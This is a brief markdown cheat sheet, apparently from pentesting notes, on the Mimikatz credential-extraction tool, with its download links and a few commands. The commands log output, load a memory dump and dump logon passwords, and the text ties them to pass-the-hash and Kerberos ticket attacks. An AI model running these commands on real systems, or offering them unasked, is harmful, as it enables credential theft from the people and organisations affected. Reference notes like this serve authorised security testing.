# Mimikatz
Tool used to extract credentials. Used for pass the hash, pass the golden ticket, pass the silver ticket. 
https://github.com/gentilkiwi/mimikatz
Download:
https://github.com/gentilkiwi/mimikatz/releases

# Commands/output > output file
```
log file.log
```

# Read from a memory dump 
```
sekurlsa::minidump {filename .dump}
```

# Get logon passwords 
```
sekurlsa::logonpasswords
```
